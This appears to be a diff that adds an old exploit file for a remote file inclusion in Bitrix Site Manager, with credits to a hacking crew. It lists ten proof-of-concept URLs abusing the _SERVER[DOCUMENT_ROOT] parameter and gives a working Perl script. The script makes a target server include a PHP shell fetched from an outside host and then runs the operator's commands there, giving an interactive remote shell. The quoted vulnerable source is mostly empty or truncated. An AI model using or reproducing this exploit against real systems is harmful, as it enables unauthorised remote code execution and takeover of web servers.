@@ -1,0 +1,144 @@
+#####
+# [+] Author : Don Tukulesto (root@indonesiancoder.com)
+# [+] Date : November 13, 2009
+# [+] Homepage : http://www.indonesiancoder.com
+# [+] Vendor : http://www.bitrixsoft.com/
+# [+] Method : Remote File Inclusion
+# [+] Location : INDONESIA
+# [~] Notes : I know this is an old bugs, but i just write this exploit under perl module.
+# [~] Refrence : http://www.securityfocus.com/bid/13965
+# [~] How To :
+# perl tux.pl cmd
+# perl tux.pl http://server/path/ http://www.indonesiancoder.org/shell.txt cmd
+# Weapon example:
+#####
+
+# [-] Bugs in
+
+[+] rss.php
+
+
+
+
+[+] redirect.php
+
+
+
+
+[+] click.php
+
+0 and CModule::IncludeModule("advertising")) CAdvBanner::Click($id);
+if (CModule::IncludeModule("statistic")) $goto = str_replace("#EVENT_GID#",CStatEvent::GetGID(),$goto);
+LocalRedirect($goto);
+?>
+
+
+[+] admin/index.php
+
+
+
+
+
+[+] tools/help.php
+
+
+
+
+[+] tools/calendar.php
+
+
+
+
+[+] tools/ticket_show_file.php
+
+
+
+
+[+] tools/imagepg.php
+
+
+
+
+[+] tools/help_view.php
+
+
+
+
+[+] tools/help_create.php
+
+
+
+
+[-] PoC
+
+http://server/BX_ROOT/rss.php?_SERVER[DOCUMENT_ROOT]=
+http://server/BX_ROOT/click.php?_SERVER[DOCUMENT_ROOT]=
+http://server/BX_ROOT/redirect.php?_SERVER[DOCUMENT_ROOT]=
+http://server/BX_ROOT/admin/index.php?_SERVER[DOCUMENT_ROOT]=
+http://server/BX_ROOT/tools/help_create.php?_SERVER[DOCUMENT_ROOT]=
+http://server/BX_ROOT/tools/help_view.php?_SERVER[DOCUMENT_ROOT]=
+http://server/BX_ROOT/tools/imagepg.php?_SERVER[DOCUMENT_ROOT]=
+http://server/BX_ROOT/tools/ticket_show_file.php?_SERVER[DOCUMENT_ROOT]=
+http://server/BX_ROOT/tools/calendar.php?_SERVER[DOCUMENT_ROOT]=
+http://server/BX_ROOT/tools/help.php?_SERVER[DOCUMENT_ROOT]=
+
+[-] eXpL0!t c0des
+
+
+#!/usr/bin/perl
+
+use HTTP::Request;
+use LWP::UserAgent;
+$RoNz = $ARGV[0];
+$Pathloader = $ARGV[1];
+$Contrex = $ARGV[2];
+if($RoNz!~/http:\/\// || $Pathloader!~/http:\/\// || !$Contrex){usage()}
+head();
+sub head()
+{
+print "[o]============================================================================[o]\r\n";
+print " | Bitrix Site Manager Multiple Remote File Include Vulnerability |\r\n";
+print "[o]============================================================================[o]\r\n";
+}
+while()
+{
+print "[w00t] \$";
+while()
+{
+$kaMtiEz=$_;
+chomp($kaMtiEz);
+$arianom = LWP::UserAgent->new() or die;
+$tiw0L = HTTP::Request->new(GET =>$RoNz.'admin/index.php?_SERVER[DOCUMENT_ROOT]='.$Pathloader.'?&'.$Contrex.'='.$kaMtiEz)or die "\nCould Not connect\n";
+$abah_benu = $arianom->request($tiw0L);
+$tukulesto = $abah_benu->content;
+$tukulesto =~ tr/[\n]/[?]/;
+if (!$kaMtiEz) {print "\nPlease Enter a Command\n\n"; $tukulesto ="";}
+elsif ($tukulesto =~/failed to open stream: HTTP request denied!/ || $tukulesto =~/: Cannot execute a blank command in /)
+{print "\nCann't Connect to cmd Host or Invalid Command\n";exit}
+elsif ($tukulesto =~/^.Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
+if($tukulesto =~ /(.*)/)
+{
+$finreturn = $1;
+$finreturn=~ tr/[?]/[\n]/;
+print "\r\n$finreturn\n\r";
+last;
+}
+else {print "[w00t] \$";}}}last;
+sub usage()
+{
+head();
+print " | Usage: perl tux.pl |\r\n";
+print " | - Full path to execute ex: http://server/path/ |\r\n";
+print " | - Path to Shell e.g http://www.indonesiancoder.org/shell.txt |\r\n";
+print " | - Command variable used in php shell |\r\n";
+print "[o]============================================================================[o]\r\n";
+print " | IndonesianCoder Team | KILL-9 CREW | ServerIsDown | AntiSecurity.org |\r\n";
+print " | kaMtiEz, M3NW5, arianom, tiw0L, Pathloader, abah_benu, VycOd, Gh4mb4S |\r\n";
+print " | M364TR0N, TUCKER, Ian Petrucii, kecemplungkalen, NoGe, bh4nd55, MainHack.Net |\r\n";
+print " | Jack-, Contrex, yadoy666, Ronz, noname, s4va, gonzhack, cyb3r_tron, saint |\r\n";
+print " | Awan Bejat, Plaque, rey_cute, BennyCooL, SurabayaHackerLink Team and YOU! |\r\n";
+print "[o]============================================================================[o]\r\n";
+print " | http://www.IndonesianCoder.org | http://www.AntiSecRadio.fm |\r\n";
+print "[o]============================================================================[o]\r\n";
+exit();
+}
